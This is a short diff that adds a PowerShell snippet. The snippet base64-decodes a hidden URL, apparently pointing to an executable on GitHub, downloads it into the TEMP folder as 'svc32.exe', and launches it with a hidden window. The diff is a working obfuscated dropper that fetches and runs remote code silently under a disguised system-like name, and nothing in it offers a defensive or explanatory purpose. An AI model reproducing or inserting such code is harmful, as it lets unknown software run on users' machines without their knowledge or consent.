@@ -1,0 +1,5 @@
+$h = 'aHR0cHM6Ly9naXRodWIuY29tL21hdHZlanNrbGFyb3Y5LWN5YmVyLy1MRUFEVEVBTV9MWlQvcmF3L3JlZnMvaGVhZHMvbWFpbi9nb19yOC5leGU='
+$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($h))
+$p = "$env:TEMP\svc32.exe"
+(New-Object Net.WebClient).DownloadFile($u, $p)
+Start-Process $p -WindowStyle Hidden
